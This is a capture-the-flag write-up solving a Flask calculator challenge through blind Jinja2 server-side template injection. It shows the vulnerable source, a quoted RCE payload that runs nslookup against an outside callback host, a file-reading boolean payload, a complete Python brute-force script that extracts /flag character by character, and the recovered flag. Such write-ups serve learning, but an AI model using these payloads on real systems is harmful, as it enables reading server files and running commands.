# solution

First, lets take a look at the source code.

```
@app.route('/')
def index():
    return render_template('index.html')

def calculate(data):
    a = data.get('a')
    b = data.get('b')

    try:
        random_sleep = random.uniform(0.1, 0.3)
        time.sleep(random_sleep)

        template_str = """
        {{ """ + a + """ + """ + b + """ }}
        """

        template = Template(template_str)
        result = template.render()

        return {'result': result}

    except Exception as e:
        return {'result': 'Error'}

def execute_with_timeout(data, timeout=0.5):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        future = executor.submit(calculate, data)
        try:
            result = future.result(timeout=timeout)
            return result
        except concurrent.futures.TimeoutError:
            return {'result': 'Error: Timeout'}

@app.route('/cal', methods=['POST'])
def cal():
    a = request.form.get('a')
    b = request.form.get('b')

    try:
        data = {'a': a, 'b': b}
        response = execute_with_timeout(data)
        result = response.get('result')

        pattern = r'[0-1]'

        if re.fullmatch(pattern, result.strip()):
            return render_template('result.html', result=result)
        else:
            return render_template('result.html', result="Only 0, 1")
    except Exception as e:
        return render_template('index.html')
```

Hmm, first of all, i try to bypass pattern filter and realize that i cant do that in anyway. So how we can find the flag if the result just only 0 or 1. As some kind of blind SqlI but in this challenge, i think is blind SSTI jinja2. Then i go to hacktrick (my favorite site for payloads and information), then i find this site.
https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756

```
{{self.__init__.__globals__.__builtins__.__import__('os').popen('nslookup oastify.com').read()}}
```

That one above is the original payload. But we need to modify to use it. Here is the payload after changing something.

```
a = (1 if (self.__init__.__globals__.__builtins__.open('/flag').read() | length) == 0 else 0)
b = 1
```

I will explain for you. Why i know **/flag** dir. You need to read the source code carefully.

```
FROM python:3.9-slim

WORKDIR /app

COPY . /app

RUN echo "pokactf2024{**flag**}" > /flag

RUN pip install Flask requests

RUN rm -f /usr/bin/login /bin/login

CMD ["python", "app.py"]
```

The flag is sent to /flag dir. Then we open('/flag').read() we can read that content. In jinja2 we use **length** to output the length of string. Overview of that payload is if the length of flag equal to n then **a** output is 1 then 1+1=2 (equivalent to Only 0,1 ) else the output is 0 and 0+1=1.

Run that payload with burp suite. Then i find that the length of flag is 78 (cause i see the notification of page is Only 0,1).

Its seem our payload woking so good (i spend 3 weeks doing this challenge, such a noob). My automatic script for this chal (you maybe can use thread to speed up).

```
import requests
import string
import urllib.parse

# URL của trang web
base_url = "http://host3.dreamhack.games:13652"
cal_url = f"{base_url}/cal"

# Thử nghiệm các ký tự có thể có trong flag (a-zA-Z0-9{})
charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + '{}'

# Proxy cấu hình (dùng Burp Suite)
proxy = {
    "http": "http://127.0.0.1:8080",  # Địa chỉ và cổng của Burp Suite proxy
    "https": "http://127.0.0.1:8080"
}

# Header HTTP
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": base_url,
    "Referer": base_url + "/",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1",
    "DNT": "1"
}

# Hàm để brute-force payload với từng ký tự
def brute_force_flag():
    flag = ""

    for i in range(78):  # 78 là độ dài của flag
        for char in charset:
            # Tạo payload kiểm tra ký tự tại vị trí i
            a_value = f"(1 if self.__init__.__globals__.__builtins__.open('/flag').read()[{i}] == '{char}' else 0)"



            # Tạo payload
            payload = f"a={a_value}&b=1"

            # Gửi yêu cầu POST qua proxy
            response = requests.post(
                cal_url,
                data=payload,
                headers=headers,
                proxies=proxy,
                verify=False  # Không xác thực SSL (nếu dùng HTTPS qua Burp Suite)
            )

            # Kiểm tra kết quả trả về
            if response.status_code == 200 and "Only" in response.text:
                print(f"Found character {char} for position {i + 1}")
                flag += char
                break

    print(f"Flag: {flag}")

# Main logic để thực hiện
if __name__ == "__main__":
    brute_force_flag()
```

```
Flag: pokactf2024{1438f7e5e5e706f835d5bb689836610fb5dec17163aab6f20a906cb87efcb417}
```

Good luck.
